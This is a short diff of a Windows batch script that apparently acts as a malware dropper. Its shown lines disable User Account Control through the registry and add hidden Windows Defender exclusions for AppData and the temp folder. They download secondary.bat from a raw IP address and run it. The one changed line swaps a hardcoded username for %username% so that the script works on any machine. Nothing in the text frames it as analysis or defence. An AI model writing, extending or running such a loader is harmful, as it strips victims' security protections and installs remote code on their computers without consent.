@@ -25,7 +25,7 @@ del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\S
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath C:/Users/%username%/AppData/Roaming/Microsoft/Windows/
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
-cd C:\Users\saif\AppData\Local\Temp\MicroWindows
+cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
 mkdir Logs
 powershell -windowstyle hidden curl http://34.88.221.44:9000/secondary.bat -o secondary.bat
 start "" secondary.bat
